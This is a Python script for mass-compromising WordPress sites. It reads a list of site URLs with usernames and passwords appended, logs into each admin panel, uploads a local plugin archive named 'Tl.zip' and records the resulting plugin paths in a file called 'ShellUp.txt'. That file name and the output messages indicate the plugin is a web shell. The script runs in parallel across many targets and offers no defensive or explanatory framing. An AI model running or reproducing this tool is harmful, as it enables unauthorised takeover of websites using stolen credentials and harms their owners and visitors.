import sys,time,re,requests,os,string,random
from multiprocessing.dummy import Pool
requests.urllib3.disable_warnings()

try:
	target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
	path = str(sys.argv[0]).split('\\')
	warning('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
	

def error(text):
	print("[E]"+text)
def warning(text):
	print("[L]"+text)
def current(text):
	print("[P]"+text)
headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}


def URLurl(site):
	if site.startswith("http://") :
		site = site.replace("http://","")
	elif site.startswith("https://") :
		site = site.replace("https://","")
	else :
		pass
	pattern = re.compile('(.*)/')
	while re.findall(pattern,site):
		sitez = re.findall(pattern,site)
		site = sitez[0]
	return site

def Check_Alive(site):
	try:
    
		StrLog = site.split('/wp-login.php#')[1]
		username  = StrLog.split("@")[0]
		password = StrLog.replace(username + "@","")
		url = 'https://' + URLurl(site)

		wpadmin = url + "/wp-login.php"
		
		Panel = requests.Session()

		data_login = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': '{}/wp-admin/'.format(url)}
		
		reslog = Panel.post(wpadmin,  data=data_login, headers=headers).content

		UploadPLugins = url + "/wp-admin/plugin-install.php?tab=upload"
		
		

		word_to_check = 'install-plugin-submit'



		response3 = Panel.get(UploadPLugins,  headers=headers, verify=False)
		wpnoce = re.findall('id="_wpnonce" name="_wpnonce" value="(.*?)"',response3.content)[0]
		submit = re.findall('id="install-plugin-submit" class="button" value="(.*?)"',response3.content)[0]

		data = {'_wpnonce':wpnoce,'_wp_http_referer':url + '/wp-admin/plugin-install.php?tab=upload','install-plugin-submit':submit}
		
		files = {'pluginzip': open('Tl.zip', 'rb')}
		#files = {'pluginzip':(FileUpload, open(FileUpload, 'rb'), 'multipart/form-data')}
		Exploting = Panel.post(url + '/wp-admin/update.php?action=upload-plugin',data=data, files=files, headers=headers )
		if 'Tl.zip' in Exploting.content:
			current('BANGBOOM ' + url + ' Upload Perfectly')
			open('ShellUp.txt','a').write(url + "/wp-content/plugins/Tl/index.php\n")
		else:
			error('SADFAILED ' + url + ' Failed')
			open('NotUpload.txt','a').write(site + "\n")

	except Exception as ex:
		error('ERROR ' + url + ' Not Working')
		open('dead.txt','a').write(site + "\n")
		
		
		
def RunTool(url):
    try:
        Check_Alive(url)
    except:
        pass
		
		
		


mp = Pool(5)
mp.map(RunTool, target)
mp.close()
mp.join()

